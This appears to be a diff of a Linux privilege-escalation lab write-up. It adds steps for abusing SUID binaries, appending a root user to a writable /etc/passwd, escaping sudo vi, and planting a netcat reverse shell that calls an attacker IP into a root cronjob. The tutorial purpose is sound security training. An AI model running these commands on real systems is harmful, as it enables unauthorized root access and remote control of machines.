@@ -98,19 +98,144 @@ Reverse the server setup and transfer the enum.txt to the attacking device for a
 `:> find / -perm -o w -type d 2>/dev/null` : recursively search from the root directory and list all world-writeable directories  
 `:> find / -perm -o x -type d 2>/dev/null` : recursively search from the root directory and list all world-executable directories  
 `:> find / -name perl* OR python* OR gcc*` : recursively search from the root directory and list development tools / supported languages  
-`:> find / -perm /1000` : recursively search from the root directory and list objects wsith the sticky bit set  
-`:> find / -perm /2000` : recursively search from the root directory and list objects wsith the SGID bit set  
-`:> find / -perm /4000` : recursively search from the root directory and list objects wsith the SUID bit set  
+`:> find / -perm -u=s -type f 2>/dev/null` : recursively search from the root directory and list all files where special privileges are set for everyone.  
+`:> find / -perm /1000` : recursively search from the root directory and list objects with the sticky bit set  
+`:> find / -perm /2000` : recursively search from the root directory and list objects with the SGID bit set  
+`:> find / -perm /4000` : recursively search from the root directory and list objects with the SUID bit set  
   
-## SUID/GUID 
+### Find exploitable binaries
 
-## Writeable /etc/passwd files
+`:> sudo -l` list commands on which the current user may use sudo
 
-## Escaping the Vi editor
+## Authentication Bypass  
 
-## Exploit Crontab
+### SUID/GUID  
+
+#### Find exploitable binaries  
+
+`find / -perm -u=s -type f 2>/dev/null`
+
+![Special Permissions Search](assets/Linux-PrivEsc-05-specials-01.png)
+
+#### Select options and validate permissions
+
+`:> ls -alh /home/user3/shell`
+
+![validate permissions](assets/Linux-PrivEsc-05-specials-02.png)
+
+#### Run the target binary
+
+`:> ./shell`
+
+Results in a root prompt  
+
+![Run the Shell](assets/Linux-PrivEsc-05-specials-03.png)
+
+### Writeable /etc/passwd files  
+
+#### Entry format  
+
+[username] : [password] : [userID] : [groupID] : [Info] : [home-directory] : [path-to-shell]
+
+#### Identify a potential user to exploit
+
+`:> cat /etc/passwd`
+
+user7 has a groupid of zero, the root group
+
+Switch to user7
+
+`:> su user7`
+
+![Run the Shell](assets/Linux-PrivEsc-06-passwd-01.png)
+
+#### Generate compliant password hash
+
+`:> openssl passwd -1 -salt new 123`  
+
+![Generate hash](assets/Linux-PrivEsc-06-passwd-02.png)  
+
+#### Identify shell options  
+
+`:> cat /etc/shells`  
+
+![Generate hash](assets/Linux-PrivEsc-06-passwd-03.png)  
+
+#### Generate the new passwd file entry for a user that will be root
+
+`new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash`
+
+#### Append the entry to /etc/passwd
+
+`:> echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd`
+
+#### Switch user
+
+`:> su new` and enter the password  
+
+![Complete](assets/Linux-PrivEsc-06-passwd-03.png)  
+
+## Escaping the Vi editor  
+
+### Identify vulnerable binaries
+
+`:> sudo -l`
+
+![exploitable bin](assets/Linux-PrivEsc-07-bins-01.png)
+
+### Start the vulnerable binary
+
+`:> sudo vi`
+
+### Use Vi command mode to open a shell with root privileges  
+
+`:> !sh`
+
+![exploited](assets/Linux-PrivEsc-07-bins-02.png)  
+
+## Exploit Crontab  
+
+### Identify cronjobs running with elevated privileges
+
+`:> cat /etc/crontab`  
+
+![find cronjobs](assets/Linux-PrivEsc-08-cron-01.png)
+
+'autoscript.sh' runs with root privilegs
+
+Open the file  
+
+`:> nano /home/user4/Desktop/autoscript.sh`
+
+![find cronjobs](assets/Linux-PrivEsc-08-cron-02.png)  
+
+![open autoscript](assets/Linux-PrivEsc-08-cron-03.png)
+
+### Use Metasploit to generate a reverse shell and place into the autoscript.sh  
+
+`:> msfvenom -p cmd/unix/reverse_netcat lhost=<attacker IP> lport=8888 R`  
+
+![payload generated](assets/Linux-PrivEsc-08-cron-04.png)  
+
+mkfifo /tmp/yphto; nc 10.201.16.214 8888 0</tmp/yphto | /bin/sh >/tmp/yphto 2>&1; rm /tmp/  
+
+### Append the exploit to the autoscript.sh file
+
+`:> echo 'mkfifo /tmp/yphto; nc 10.201.16.214 8888 0</tmp/yphto | /bin/sh >/tmp/yphto 2>&1; rm /tmp/' >> /home/user4/Desktop/autoscript.sh`   
+
+### Start a netcat listener on the Attacking device  
+
+`:> nc -lvnp 8888`
+
+### Wait for the connection
+
+![shell received](assets/Linux-PrivEsc-08-cron-05.png)  
 
 ## Exploiting the PATH variable
+
+### Show the current user's path  
+
+`:> echo $PATH`
 
 ## Other References
 
